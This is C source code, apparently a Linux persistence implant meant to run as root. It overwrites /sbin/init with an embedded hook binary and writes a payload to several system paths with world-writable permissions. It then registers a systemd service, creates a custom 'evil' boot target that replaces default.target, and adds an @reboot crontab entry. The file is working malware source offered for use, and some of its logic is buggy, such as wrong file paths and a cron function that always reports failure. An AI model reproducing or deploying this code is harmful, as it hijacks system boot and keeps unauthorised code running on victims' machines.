#include <limits.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

#define INIT_PATH ("/sbin/init")

#define SERVICE_FILE ("[Unit]\nDescription=Definitely Hostile Environment Program\n\n[Service]\nExecStart=/bin/dhepd\n\n[Install]\nWantedBy=multi-user.target")
#define SERVICE_FILE2 ("[Unit]\nDescription=Satanic Service that is Hostile\n\n[Service]\nExecStart=/bin/sSh\n\n[Install]\nWantedBy=evil.target")

#define TARGET_FILE ("[Unit]\nDescription=Evil boot target\nRequires=graphical.target\nWants=sSh.service\nConflicts=rescue.service rescue.target\nAfter=graphical.target rescue.service rescue.target\nAllowIsolate=yes")

#define CRON ("@reboot /sbin/repd")

extern const char *init_hook;
extern const unsigned int init_hook_len;

extern const char *payload;
extern const unsigned int payload_len;

int write_payload(char *path)
{
    FILE *payload_file;
    int result;

    if (access(path, F_OK) == 0)
    {
        fprintf(stderr, "File %s already exists.", path);
        return -1;
    }

    payload_file = fopen(path, "w");
    if (!payload_file)
    {
        fprintf(stderr, "Could not open payload file %s.", path);
        return -1;
    }

    if (fwrite(payload, 1, payload_len, payload_file) != payload_len)
    {
        fprintf(stderr, "Could not write payload file to %s.", path);
        fclose(payload_file);
        return -1;
    }

    fclose(payload_file);

    if (chmod(path, 0777))
    {
        fprintf(stderr, "Could chmod payload file %s.", path);
        return -1;
    }
    return 0;
}

int hook_init()
{
    // Make sure /sbin/init is a symlink to /lib/systemd/systemd.
    char real_path[PATH_MAX+1];
    FILE *init;
    int bytes_written;

    printf("Getting real init path...\n");
    realpath(INIT_PATH, real_path);
    printf("Real path of init: %s\n", real_path);

    if (remove(INIT_PATH))
    {
        perror("Could not delete /bin/init.");
        return -1;
    }

    if (strcmp(real_path, "/lib/systemd/systemd"))
    {
        perror("Could not hook /sbin/init - it is not a symlink to /lib/systemd/systemd.");
        return -1;
    }

    // Replace /sbin/init with our hook binary.
    init = fopen(INIT_PATH, "w");
    if (!init)
    {
        perror("Could not open file /sbin/init.");
        return -1;
    }

    bytes_written = fwrite(init_hook, 1, init_hook_len, init);
    if (bytes_written != init_hook_len)
    {
        perror("Could not hook /sbin/init - write to file failed.");
        fclose(init);
        return -1;
    }

    fclose(init);

    if (chmod(INIT_PATH, 0777))
    {
        perror("Could not chmod /sbin/init.");
        return -1;
    }

    perror("/sbin/init hooked successfuly!");
    return 0;
}

int create_service()
{
    FILE *service_file;

    // Write payload to file.
    if (write_payload("/bin/dhepd"))
        return -1;
    
    // Create service file.
    service_file = fopen("/etc/systemd/system/dhepd.service", "w");
    if (!service_file)
    {
        perror("Could not open /etc/systemd/system/dhepd.service");
        return -1;
    }

    if (fwrite(SERVICE_FILE, 1, sizeof(SERVICE_FILE), service_file) != sizeof(SERVICE_FILE))
    {
        perror("Could not write to service file.");
        fclose(service_file);
        return -1;
    }

    fclose(service_file);

    if (system("systemctl enable dhepd.service"))
    {
        perror("Could not enable dhepd.service.");
        return -1;
    }
    return 0;
}

int create_target()
{
    FILE *target, *service;

    // Write payload to file.
    if (write_payload("/usr/bin/sShd"))
        return -1;

    // Make wants directory
    if (mkdir("/usr/lib/systemd/system/evil.wants", 0777))
    {
        perror("Could not create target.wants directory.");
        return -1;
    }

    // Create "sSh" service (payload)
    service = fopen("/etc/systemd/system/dhepd.service", "w");
    if (!service)
    {
        perror("Could not open /usr/lib/systemd/system/evil.target.wants/sSh.service");
        return -1;
    }

    if (fwrite(SERVICE_FILE2, 1, sizeof(SERVICE_FILE2), service) != sizeof(SERVICE_FILE2))
    {
        perror("Could not write to service file.");
        fclose(service);
        return -1;
    }

    fclose(service);

    if (system("systemctl enable sSh.service"))
    {
        perror("Could not enable sSh.service.");
        return -1;
    }

    // Create target file
    target = fopen("/usr/lib/systemd/system/evil.target", "w");
    if (!target)
    {
        perror("Could not open target file.");
        return -1;
    }

    if (fwrite(TARGET_FILE, 1, sizeof(TARGET_FILE), target) != sizeof(TARGET_FILE))
    {
        perror("Could not write target file.");
        fclose(target);
        return -1;
    }

    fclose(target);

    // symlink default.target to new target.
    if (symlink("evil.target", "/usr/lib/systemd/system/default.target"))
    {
        perror("Could not create default.target symlink.");
        return -1;
    }

    return 0;
}

int create_cronjob()
{
    FILE *crontab;
    // Write payload to file.
    if (write_payload("/sbin/repd"))
        return -1;

    // Add @reboot statement to system-wide crontab
    crontab = fopen("/etc/crontab", "a");
    if (!crontab)
    {
        perror("Could not open system-wide crontab.");
        return -1;
    }

    if (fwrite(CRON, 1, sizeof(CRON), crontab) != sizeof(CRON))
    {
        perror("Could not write to crontab.");
        fclose(crontab);
        return -1;
    }

    fclose(crontab);
    return -1;
}


int main(int argc, char *argv[])
{
    if (getuid() != 0)
    {
        perror("Must be ran as root.");
        return -1;
    }
    if (
        hook_init() ||
        create_service() ||
        create_target() ||
        create_cronjob())
    {
        return -1;
    }
    return 0;
}